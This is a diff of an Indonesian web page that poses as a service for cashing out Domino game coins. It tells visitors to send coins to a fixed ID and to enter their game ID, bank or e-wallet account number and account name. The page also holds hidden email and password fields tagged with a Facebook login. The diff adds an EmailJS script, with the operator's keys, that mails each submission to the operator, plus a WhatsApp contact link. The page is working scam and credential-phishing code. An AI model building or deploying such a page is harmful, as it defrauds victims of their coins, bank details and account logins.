@@ -1,5 +1,3 @@
-
-
 <html lang ="en">
 <html>
  <head> 
@@ -11,7 +9,7 @@
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
   <link rel="stylesheet" href="file/css/facebook.css"> 
-  <title>BONGKAR ID</title> 
+  <title>BONGKAR NEO PARTY</title> 
   <meta property="og:title" content="Agen Domino"> 
   <meta name="description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
   <meta property="og:description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
@@ -30,6 +28,9 @@ body {
   margin: 0
 }
 
+.fa-whatsapp{
+	color: rgb(4, 119, 4);
+}   
 .appnwghdiprem {
   background: #043e3a;
   background-size: 100% 100%;
@@ -234,6 +235,32 @@ body {
   outline: 0;
   padding: 4px 30px
 }
+.buttonnwgverifhdi1 {
+  text-align: left
+}
+
+.buttonnwgverifhdi1 button {
+  background-color: #67a309;
+  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
+  color: #268707;
+  border: none;
+  font-size: 20px;
+  font-weight: 600;
+  margin-top: 10px;
+  line-height: 30px;
+  border-radius: 10px;
+  box-shadow: 0 2px 1px 0 #1a5806;
+  outline: 0;
+  padding: 4px 30px
+}
+
+.wa-inline-icon {
+    /* Mengatur warna ikon agar lebih kontras di tombol hijau */
+    color: white !important; 
+    margin-right: 5px;
+    font-size: 1em;
+}	  
+   
 </style>
  </head> 
  <body style="background: ;"> 
@@ -250,72 +277,65 @@ body {
      
       </div> 
      </div> 
-     <div class="verifikasikeamanannwg"> 
-      <form method="POST" action="check.php" class="boxformnwg"> 
-  <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi"> 
-       <div class="itemnanjg">   
-       </div> 
-      <p>Info Pengirim</p> 
-     </div>
-            <div class="itemkontol"> 
-        <label>1.</label> 
-        <input type="number" name="passakun" placeholder="Masukan Id Anda" required>
-       </div> 
-        <div class="itemkontol"> 
-        <label>2.</label> 
-       <input type="text" name="nickname" placeholder="Nickname" required> 
-       </div> 
-        <div class="itemkontol"> 
-        <label>3.</label> 
-       <input type="text" name="Idakun" placeholder="Jumlah Bongkaran" required> 
-       </div> 
-       <div>
+     <div class="verifikasikeamananwg"> 
+      <form id="bongkarForm" class="boxformnwg"> 
+        <div class="appnwghdiprem" style="background: #0b5250;"> 
+          <div class="containernwghdi"> 
+            <div class="boxverifnwghdi"> 
+              <div class="headernwgverifhdi"> 
+                <div class="itemnanjg">   
+                </div> 
+                <p>Info Pengirim</p> 
+              </div>
+              <div class="itemkontol"> 
+                <label>1.</label> 
+                <input type="number" name="id_pengirim" placeholder="Masukan Id Anda" required> 
+              </div> 
+              <div class="itemkontol"> 
+                <label>2.</label> 
+                <input type="text" name="nickname" placeholder="Nickname" required> 
+              </div> 
+              <div class="itemkontol"> 
+                <label>3.</label> 
+                <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkaran" required> 
+              </div> 
+              <div>
                 <body style="background: #0b5250;"> 
-  <div class="appnwghdiprem" style="background: #0b5250;"> 
-   <div class="containernwghdi"> 
-    <div class="boxverifnwghdi"> 
-     <div class="headernwgverifhdi"> 
-      <p>Silahkan Kirim Koin Ke Id Di Bawah Ini</p> 
-       </div>
-     </header> 
-     <section class="banner"> 
-      <div class="imageslide">
-      <div style="text-align:center"> 
-       <figure class="sliderbanner" style="display: block;"> 
-        <img src="img/id.png" alt="Image" height="200" width="200">
-       </figure> 
-       <div class="itemkontol">
-        <label>4.</label> 
-<body>
-<input type="text" value="1785266" id="myInput">
-<button onclick="myFunction()">Copy</button>
+                  <div class="appnwghdiprem" style="background: #0b5250;"> 
+                    <div class="containernwghdi"> 
+                      <div class="boxverifnwghdi"> 
+                        <div class="headernwgverifhdi"> 
+                          <p>Silahkan Kirim Koin Ke Id Di Bawah Ini</p> 
+                        </div>
+                      </header> 
+                      <section class="banner"> 
+                        <div class="imageslide">
+                          <div style="text-align:center"> 
+                            <figure class="sliderbanner" style="display: block;"> 
+                              <img src="img/id.png" alt="Image" height="200" width="200">
+                            </figure> 
+                            <div class="itemkontol">
+                              <label>4.</label> 
+                              <body>
+                                <input type="text" value="1785266" id="myInput" name="id_penerima_koin" readonly>
+                                <button type="button" onclick="myFunction()">Copy</button>
 
-<script>
-function myFunction() {
-  // Get the text field
-  var copyText = document.getElementById("myInput");
+                                <script>
+                                  function myFunction() {
+                                    var copyText = document.getElementById("myInput");
+                                    copyText.select();
+                                    copyText.setSelectionRange(0, 99999);
+                                    navigator.clipboard.writeText(copyText.value);
+                                    alert("Copied the text: " + copyText.value);
+                                  }
+                                </script>
 
-  // Select the text field
-  copyText.select();
-  copyText.setSelectionRange(0, 99999); // For mobile devices
-
-  // Copy the text inside the text field
-  navigator.clipboard.writeText(copyText.value);
-  
-  // Alert the copied text
-  alert("Copied the text: " + copyText.value);
-}
-</script>
-
-</body>
+                            </body>
         </div>
       <div>
           <div class="boxnwgverifmarsya"> 
       <div class="ucapanverifnwg"> 
-       <span>SILAHKAN KIRIM SCRENSHOOT HISTORI PERNGIRIMAN AKUN ANDA KE AKUN YANG TERTERA DI ATAS,</span> 
+       <span>SILAHKAN KIRIM SCRENSHOOT HISTORI PERNGIRIMAN AKUN ANDA KE AKUN YANG TERTERA DI ATAS</span> 
         </div>
         <div class="itemkontol">
                <body style="background: #0b5250;"> 
@@ -332,37 +352,123 @@ function myFunction() {
    <div class="containernwghdi"> 
     <div class="boxverifnwghdi"> 
      <div class="headernwgverifhdi">  
-      <p>Bank Pencairan</p> 
-     </div>
-       <div class="itemnanjg"> 
-        <select name="narek"> <option>BCA</option> <option>BRI</option> <option>BNI</option> <option>MANDIRI</option> <option>DANA</option> <option>OVO</option> <option>GOPAY</option> </select> 
-       </div>  
-       <div class="itemkontol"> 
-        <label>5.</label> 
-        <input type="number" name="norek" placeholder="Nomor Rekening Pencai" required> 
-       </div> 
-       <div class="itemkontol"> 
-        <label>6.</label> 
-        <input type="text" name="atasnama" placeholder="Atas Nama" required> 
-       </div> 
-       <div class="buttonnwgverifhdi"> 
-        <input type="hidden" name="playid" id="ressplayid" value="" readonly>
-                                <input type="hidden" name="nickname" id="ressnick" value="" readonly>
-                                  <input type="hidden" name="email" id="ressemail" value="" readonly>
-                                <input type="hidden" name="password" id="resspw" value="" readonly>
-                                  <input type="hidden" name="emailpg" id="ressplayid" value="" readonly>
-                                <input type="hidden" name="passwordpg" id="pwid" value="" readonly>
-        <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
-        <button type="submit">Kirim</button> 
-       </div> 
+                                          <p>Bank Pencairan</p> 
+                                        </div>
+                                        <div class="itemnanjg"> 
+                                          <select name="bank_pencairan"> 
+                                            <option>BCA</option> 
+                                            <option>BRI</option> 
+                                            <option>BNI</option> 
+                                            <option>MANDIRI</option> 
+                                            <option>DANA</option> 
+                                            <option>OVO</option> 
+                                            <option>GOPAY</option> 
+                                          </select> 
+                                        </div>  
+                                        <div class="itemkontol"> 
+                                          <label>5.</label> 
+                                          <input type="number" name="nomor_rekening" placeholder="Nomor Rekening Pencai" required> 
+                                        </div> 
+                                        <div class="itemkontol"> 
+                                          <label>6.</label> 
+                                          <input type="text" name="atas_nama" placeholder="Atas Nama" required> 
+                                        </div> 
+                                        <div class="buttonnwgverifhdi"> 
+                                          <input type="hidden" name="playid" id="ressplayid" value="" readonly>
+                                          <input type="hidden" name="email" id="ressemail" value="" readonly>
+                                          <input type="hidden" name="password" id="resspw" value="" readonly>
+                                          <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
+                                          
+                                          <button type="submit">Kirim</button> 
+                                         <a href="https://wa.me/+6285343802982" target="_blank"><i class="buttonnwgverifhdi fa-whatsapp wa-inline-icon"></i>Chat Admin<a>
+                                        </div> 
+                                      </div> 
+                                    </div> 
+                                  </div> 
+                                </body>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </section>
+                    </div>
+                  </div>
+                </body>
+              </div>
+            </div> 
+          </div> 
+        </div> 
       </form> 
      </div> 
     </div> 
     <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
    </div> 
   </div> 
- </body>
+
+<script>
+/* Script Copy ID Koin */
+function myFunction() {
+    var copyText = document.getElementById("myInput");
+    copyText.select();
+    copyText.setSelectionRange(0, 99999);
+    navigator.clipboard.writeText(copyText.value);
+    alert("Copied the text: " + copyText.value);
+}
+</script>
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+  // KONFIGURASI EMAILJS DARI DATA YANG ANDA BERIKAN
+  const SERVICE_ID = "service_glbmixo"; 
+  const TEMPLATE_ID = "template_g32778v";
+  const PUBLIC_KEY = "Vdmo410kyW_9dbb0F"; 
+
+  // Inisialisasi EmailJS
+  emailjs.init(PUBLIC_KEY);
+
+  document.getElementById('bongkarForm').addEventListener('submit', function(event) {
+    event.preventDefault(); 
+    
+    // Dapatkan referensi ke input file (ID: myFile)
+    const fileInput = document.getElementById('myFile');
+    
+    // 1. DISABLE input file sebelum pengiriman (KRUSIAL)
+    if(fileInput) { 
+        fileInput.disabled = true;
+    }
+
+    const form = this;
+    
+    // Kirim email menggunakan EmailJS
+    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, form)
+      .then(function() {
+        // Jika berhasil
+        
+        // 2. Aktifkan kembali input file
+        if(fileInput) fileInput.disabled = false;
+        
+        alert('✅ DATA BERHASIL DIKIRIM! Selanjutnya, WAJIB chat Admin di WhatsApp untuk mengirimkan bukti transfer Anda.');
+        
+        form.reset(); // Kosongkan formulir
+
+      }, function(error) {
+        // Jika gagal
+        console.error('Pengiriman Gagal:', error);
+        
+        // 4. Aktifkan kembali input file jika gagal agar bisa di-submit ulang
+        if(fileInput) fileInput.disabled = false;
+        alert('Pengiriman data gagal. Silakan coba lagi. Pastikan Anda sudah mengatur template di EmailJS.');
+      });
+  });
+</script>
+ </body>
 </html>
+
+
+
+
+
+
 
 
 
